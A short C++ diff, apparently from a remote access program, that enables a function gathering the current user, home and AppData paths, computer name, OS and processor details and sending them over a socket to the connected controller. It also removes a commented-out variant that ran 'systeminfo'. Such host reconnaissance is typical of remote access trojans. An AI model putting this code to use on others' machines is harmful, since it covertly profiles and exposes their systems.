@@ -282,7 +282,7 @@ void Transfer::getTemp(Client* client)
 void InfoClient::getsysinfo(Client* client)
 {
 	client->send_b("Getting system info ...");
-	/*
+	
 	std::string buffer;
 	std::string user = getenv("USERNAME");
 	std::string userhome = getenv("HOMEPATH");
@@ -297,18 +297,6 @@ void InfoClient::getsysinfo(Client* client)
 	buffer = "\nCurrent user\t\t: " + user + "\nUser directory\t\t: " + userhome + "\nWindows directory\t: " + windir + "\nLocal Appdata\t\t: " + localappdate;
 	buffer += "\nSystem drive\t\t: " + systemdrive + "\nOS\t\t\t: " + OS + "\nComputer name\t\t: " + computername + "\nProcessor identifier\t: " + proco;
 	client->send_b(buffer.c_str());
-	*/
-
-	/*
-	std::string ret = Shell::return_command("systeminfo");
-	
-	std::cout << ret << std::endl;
-	Sleep(4000);
-	send(*client->getSock(), "HUGE_BUFFER", BUFFER_LEN, 0);
-	send(*client->getSock(), ret.c_str(), HUGE, 0);
-	send(*client->getSock(), "Done", 5, 0);
-	//  gci env:* | sort-object name
-	*/
 
 }
 
